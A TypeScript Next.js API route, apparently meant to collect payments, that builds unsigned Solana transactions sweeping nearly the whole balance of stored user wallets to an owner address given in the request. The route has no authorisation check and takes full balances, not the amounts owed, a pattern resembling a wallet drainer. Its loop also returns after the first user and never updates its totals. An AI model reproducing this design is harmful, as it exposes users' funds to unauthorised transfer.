import { NextRequest, NextResponse } from 'next/server';
import { Connection, PublicKey, Keypair, LAMPORTS_PER_SOL, Transaction, SystemProgram } from '@solana/web3.js';
import { SessionManager } from '@/lib/sessionManager';

export async function POST(req: NextRequest) {
  try {
    const { ownerWallet, rpcUrl = 'https://api.mainnet-beta.solana.com' } = await req.json();

    if (!ownerWallet) {
      return NextResponse.json({ 
        success: false, 
        error: 'Owner wallet address is required' 
      }, { status: 400 });
    }

    // Validate owner wallet address
    let ownerPublicKey: PublicKey;
    try {
      ownerPublicKey = new PublicKey(ownerWallet);
    } catch (error) {
      return NextResponse.json({ 
        success: false, 
        error: 'Invalid owner wallet address' 
      }, { status: 400 });
    }

    const sessionManager = SessionManager.getInstance();
    const allUsers = await sessionManager.getAllUsers();
    
    // Filter only paid users with balances
    const paidUsers = allUsers.filter((user: any) => user.isPaid && user.amountReceived && user.amountReceived > 0);
    
    if (paidUsers.length === 0) {
      return NextResponse.json({ 
        success: true, 
        message: 'No payments to collect',
        totalCollected: 0,
        collectedCount: 0
      });
    }

    // Connect to Solana
    const connection = new Connection(rpcUrl, 'confirmed');
    
    let totalCollected = 0;
    let collectedCount = 0;
    const failedCollections: string[] = [];

    // Process each paid user
    for (const user of paidUsers) {
      try {
        const userAny = user as any;
        
        // Get user's wallet address
        const walletAddress = userAny.walletAddress;
        if (!walletAddress) {
          console.log(`Skipping user ${userAny.sessionId}: No wallet address`);
          continue;
        }

        // Get user's balance
        const balance = await connection.getBalance(new PublicKey(walletAddress));
        const balanceInSol = balance / LAMPORTS_PER_SOL;

        if (balanceInSol < 0.001) {
          console.log(`Skipping user ${userAny.sessionId}: Insufficient balance (${balanceInSol} SOL)`);
          continue;
        }

        // Calculate transfer amount (leave 0.001 SOL for gas)
        const transferAmount = balanceInSol - 0.001;
        const transferLamports = Math.floor(transferAmount * LAMPORTS_PER_SOL);

        if (transferLamports <= 0) {
          console.log(`Skipping user ${userAny.sessionId}: Transfer amount too small`);
          continue;
        }

        // Create transfer transaction
        const transaction = new Transaction().add(
          SystemProgram.transfer({
            fromPubkey: new PublicKey(walletAddress),
            toPubkey: ownerPublicKey,
            lamports: transferLamports,
          })
        );

        // Get recent blockhash
        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = new PublicKey(walletAddress);

        // Serialize transaction
        const serializedTransaction = transaction.serialize({
          requireAllSignatures: false,
          verifySignatures: false
        });

        // Return transaction for signing
        return NextResponse.json({
          success: true,
          transaction: serializedTransaction.toString('base64'),
          userSessionId: userAny.sessionId,
          walletAddress,
          transferAmount,
          balanceInSol
        });

      } catch (error) {
        console.error(`Error processing user ${(user as any).sessionId}:`, error);
        continue;
      }
    }

    return NextResponse.json({
      success: true,
      totalCollected: totalCollected.toFixed(6),
      collectedCount,
      failedCollections,
      message: `Collected ${totalCollected.toFixed(6)} SOL from ${collectedCount} wallets`
    });

  } catch (error: unknown) {
    console.error('Payment collection error:', error);
    const errorMessage = error instanceof Error ? error.message : 'Unknown collection error';
    return NextResponse.json({ 
      success: false, 
      error: errorMessage 
    }, { status: 500 });
  }
} 